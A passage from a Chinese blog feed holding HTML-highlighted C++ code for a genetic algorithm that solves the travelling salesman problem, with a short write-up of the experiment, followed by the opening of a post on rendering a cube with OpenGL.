		<span class="token keyword">int</span> n <span class="token operator">=</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		distance <span class="token operator">=</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">>></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">double</span> dis <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">-</span> coords<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">-</span> coords<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				distance<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">initRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> temp<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			temp<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> idNum<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">random_shuffle</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> temp<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			route<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		fitness <span class="token operator">=</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span></span></span><span class="token punctuation">(</span>idNum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 初始化适应度大小</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">updateFitness</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 适应度函数 f = 1/D（D为路线的距离总和）</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> idNum<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">double</span> D <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">int</span> xi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					xi <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
					xi <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				D <span class="token operator">+=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>xi<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">-</span> coords<span class="token punctuation">[</span>yi<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>xi<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">-</span> coords<span class="token punctuation">[</span>yi<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>minDistance <span class="token operator">></span> D<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				minDistance <span class="token operator">=</span> D<span class="token punctuation">;</span>
				bestRoute <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			fitness<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> D<span class="token punctuation">;</span>
			fitness<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">=</span> i<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">selectAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 根据适应度带权选择个体</span>
		<span class="token function">sort</span><span class="token punctuation">(</span>fitness<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fitness<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">greater</span><span class="token generic class-name"><span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> newRoute <span class="token operator">=</span> route<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> idNum<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			newRoute<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> route<span class="token punctuation">[</span>fitness<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		route <span class="token operator">=</span> newRoute<span class="token punctuation">;</span>
		<span class="token function">random_shuffle</span><span class="token punctuation">(</span>route<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> route<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">crossAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> child1<span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> child2<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> idNum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">// route[i] 与 route[i + 1] 交叉</span>
			child1 <span class="token operator">=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
			child2 <span class="token operator">=</span> route<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> rVal1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> route<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> rVal2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> route<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>rVal1<span class="token punctuation">,</span> rVal2<span class="token punctuation">)</span><span class="token punctuation">,</span> p2 <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>rVal1<span class="token punctuation">,</span> rVal2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 随机确定左右区间</span>
			<span class="token keyword">int</span> k <span class="token operator">=</span> p1<span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> route<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">auto</span> it <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> p1<span class="token punctuation">,</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> p2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> route<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">!=</span> route<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> p2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token function">swap</span><span class="token punctuation">(</span>child2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> child1<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			route<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> child1<span class="token punctuation">;</span>
			route<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> child2<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">variationAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 随机交换路线中的两城市顺序</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> idNum <span class="token operator">*</span> variProbability<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> randInd <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> idNum<span class="token punctuation">;</span>
			<span class="token keyword">int</span> rVal1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> route<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> rVal2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> route<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">swap</span><span class="token punctuation">(</span>route<span class="token punctuation">[</span>randInd<span class="token punctuation">]</span><span class="token punctuation">[</span>rVal1<span class="token punctuation">]</span><span class="token punctuation">,</span> route<span class="token punctuation">[</span>randInd<span class="token punctuation">]</span><span class="token punctuation">[</span>rVal2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token keyword">void</span> <span class="token function">geneticsAlgorithm</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		coords <span class="token operator">=</span> <span class="token function">extraData</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从文本提取坐标数据</span>
		<span class="token function">initDistance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 初始化距离矩阵</span>
		<span class="token function">initRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 随机生成初始路线</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">updateFitness</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 计算适应度</span>
			<span class="token function">selectAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 自然选择</span>
			<span class="token function">crossAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 交叉遗传</span>
			<span class="token function">variationAlgorithm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 随机变异</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 每 100 次打印当前最优解</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"迭代次数："</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"当前最短路径："</span> <span class="token operator">&lt;&lt;</span> minDistance <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">getBestRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> bestRoute<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
	<span class="token keyword">double</span> <span class="token function">getMinDistance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> minDistance<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
	vector<span class="token operator">&lt;</span>point<span class="token operator">></span> <span class="token function">getCoords</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> coords<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	TSP tsp<span class="token punctuation">;</span>
	tsp<span class="token punctuation">.</span><span class="token function">geneticsAlgorithm</span><span class="token punctuation">(</span><span class="token string">"./data.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> bestRoute <span class="token operator">=</span> tsp<span class="token punctuation">.</span><span class="token function">getBestRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> minDistance <span class="token operator">=</span> tsp<span class="token punctuation">.</span><span class="token function">getMinDistance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最短路径长度为："</span> <span class="token operator">&lt;&lt;</span> minDistance <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"最短路径如下所示："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> bestRoute<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> bestRoute<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// debug</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n---------------------------------------------------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">double</span> D <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> coords <span class="token operator">=</span> tsp<span class="token punctuation">.</span><span class="token function">getCoords</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> xi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			xi <span class="token operator">=</span> bestRoute<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> bestRoute<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			xi <span class="token operator">=</span> bestRoute<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> yi <span class="token operator">=</span> bestRoute<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		D <span class="token operator">+=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>xi<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">-</span> coords<span class="token punctuation">[</span>yi<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">pow</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>xi<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">-</span> coords<span class="token punctuation">[</span>yi<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"计算得到 D = "</span> <span class="token operator">&lt;&lt;</span> D <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次实验通过一个旅行商问题的例子，让我很好地理解了遗传算法的设计思路及其用来求解问题的方式。</p>
<p>实验中遇到的最多的问题还是在交叉遗传部分，对于该部分算法的选择与设计花了不少功夫，起初为了方便起见，本想直接采取双亲基因序列各取一部分的方式，但这种方式在 TSP 问题中显然是不适用的，因为这样拼接而成的子代无法保证 TSP 问题所要求的“每个城市各走一遍”的原则。最终在权衡之下，选择了 Subtour Exchange Crossover 算法，代码实现不算复杂且性能良好。</p>
<p>另一个问题就是遗传算法的收敛速度较慢，我在多次进行试验之后发现对于一个 127 个点的数据，算法普遍会在 15000 次之后基本收敛，因此循环次数设定为了 20000 次，以便更好地对数据进行分析。</p>
<p>变异概率的设定同样值得考虑，一般设定在 0.01~0.1，因为变异并不总是有利的，因此不宜过大；同样不宜过小，否则不易得到最优的结果，收敛速度将更慢。</p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>人工智能</tag>
        <tag>旅行商问题</tag>
      </tags>
  </entry>
  <entry>
    <title>使用OpenGL渲染一个立方体</title>
    <url>/2022/01/19/%E4%BD%BF%E7%94%A8OpenGL%E6%B8%B2%E6%9F%93%E4%B8%80%E4%B8%AA%E7%AB%8B%E6%96%B9%E4%BD%93/</url>
    <content><![CDATA[<p>本文将介绍如何使用最为常用的图形 API —— OpenGL 来渲染一个立方体，代码部分来自于《Computer Graphics Programming in OpenGL with C++》，并加入了自己的理解。</p>
<span id="more"></span>

<h1 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在编写程序之前，需要先配置好一些有助于程序编写的第三方库，本次实验需要用到的库有三个：用于窗口管理的 GLFW 库，扩展功能的 GLEW 库，以及用于数学运算的 GLM 库。</p>
<p>IDE 使用的是 Visual Studio 2019，并安装了 GLSL Language Integration 插件来实现 glsl 语言的代码高亮和自动补全。</p>
<p>具体的环境配置过程在此不过多赘述，本文主要聚焦于代码的实现。</p>
<h2 id="窗口的创建"><a href="#窗口的创建" class="headerlink" title="窗口的创建"></a>窗口的创建</h2><p>要将渲染的图像显示出来，就需要创建一个特定的显示窗口，首先通过 <code>glfwWindowHint()</code> 指定 OpenGL 的版本号，再使用 <code>glfwCreateWindow()</code> 创建 GLFW 窗口。由于创建 GLFW 窗口并不会自动将它与当前 OpenGL 上下文关联起来，因此还需要调用 <code>glfwMakeContextCurrent()</code>.</p>
<p>为了防止画面撕裂的发生，我们通常需要使用 <code>glfwSwapInterval()</code> 来开启垂直同步（Vsync）。 </p>
<p>同时，在图形渲染的循环语句中，还需要加入 <code>glfwSwapBuffers()</code> 来绘制屏幕，加入 <code>glfwPollEvents()</code> 来处理窗口相关事件，包括最小化、关闭、拉伸等操作。</p>
